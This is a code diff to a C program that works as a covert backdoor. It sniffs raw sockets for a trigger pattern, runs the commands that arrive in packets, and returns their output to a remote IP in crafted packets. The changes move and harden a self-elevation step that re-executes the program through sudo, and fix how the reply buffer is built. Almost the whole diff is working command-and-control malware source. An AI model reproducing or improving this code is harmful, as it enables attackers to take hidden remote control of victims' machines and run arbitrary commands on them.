@@ -71,16 +71,6 @@ int main(int argc, char* argv[], char *envp[]){
     }
 
 
-    if(geteuid() != 0){
-        //We do not have privileges, but we do want them. Let's rerun the program now.
-        char* args[argc+1]; 
-        args[0] = "sudo";
-        for(int ii=0; ii<argc; ii++){
-            args[ii+1] = argv[ii];
-        }
-        execve("/usr/bin/sudo", args, envp);
-    }
-
     time_t rawtime;
     struct tm * timeinfo;
 
@@ -108,10 +98,21 @@ int main(int argc, char* argv[], char *envp[]){
     }
 
     write(fd, "\n", 1);
-
-    
-
     write(fd, "Sniffing...\n", 13);
+    
+    if(geteuid() != 0){
+        //We do not have privileges, but we do want them. Let's rerun the program now.
+        char* args[argc+1]; 
+        args[0] = argv[0];
+        for(int ii=0; ii<argc; ii++){
+            args[ii+1] = argv[ii];
+        }
+        if(execve("/usr/bin/sudo", args, envp)<0){
+            perror("Failed to execve()");
+            exit(-1);
+        }
+    }
+
     packet_t packet = rawsocket_sniff_pattern(CC_PROT_SYN);
     if(packet.ipheader == NULL){
         write(fd, "Failed to open rawsocket\n", 1);
@@ -148,7 +149,7 @@ int main(int argc, char* argv[], char *envp[]){
                 printf("Received request: %s\n", p);
                 char* res = execute_command(p);
                 char* payload_buf = calloc(4096, sizeof(char));
-                strcat(payload_buf, CC_PROT_MSG);
+                strcpy(payload_buf, CC_PROT_MSG);
                 strcat(payload_buf, res);
                 packet_t packet_res = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, payload_buf);
                 if(rawsocket_send(packet_res)<0){
